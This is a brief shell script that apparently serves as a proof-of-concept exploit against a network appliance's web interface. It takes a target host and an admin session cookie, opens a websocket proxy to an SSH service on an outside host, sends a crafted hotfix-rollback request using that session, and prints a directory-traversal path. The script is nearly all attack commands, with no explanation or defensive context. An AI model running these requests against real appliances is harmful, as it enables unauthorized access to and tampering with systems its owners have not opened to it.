#!/bin/sh
appliance="$1"
admin_session="$2"
websocat "wss://$appliance/wsproxy?bmID=1234&serviceType=SSH&host=server.example&port=8188"
curl "https://$appliance:8443/rollbackConfirm.action" \
  -H "Cookie: JSESSIONID=$admin_session" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'command=rollback&hotfix=hotfix-12.5&rollbackHotfixTime='
printf '%s\n' '../../../../../tmp/report.txt'
